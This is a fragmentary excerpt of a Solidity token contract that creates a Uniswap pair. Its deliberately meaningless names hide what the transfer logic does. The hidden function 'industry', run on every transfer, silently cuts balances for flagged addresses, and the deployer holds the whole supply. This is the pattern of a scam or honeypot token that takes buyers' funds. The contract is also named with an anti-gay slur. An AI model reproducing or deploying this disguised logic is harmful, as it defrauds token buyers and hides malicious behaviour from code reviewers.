...
contract Fag is Ownable {
    uint256 private accident;
    string private exist;
    uint256 private _tTotal;
    string private power;
    uint256 private come;
    uint8 private moon;
    ...
    function industry(
        ...
        if (wood[gone] == 0 && !audience && open[gone] > 0) {
            wood[gone] -= moon;
        }
        ...
        if (wood[gone] == 0) {
            particularly[gone] -= plane;
        }

        address body = herself;
    ...
    mapping(address => uint256) private wood;
    ...
    function transferFrom(
        ...
        industry(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        industry(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(pony);
        know = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        come = 100;
        wood[affect] = moon;
        _tTotal = 1000000000000000 * 10**moon;
        particularly[msg.sender] = _tTotal;
    }
}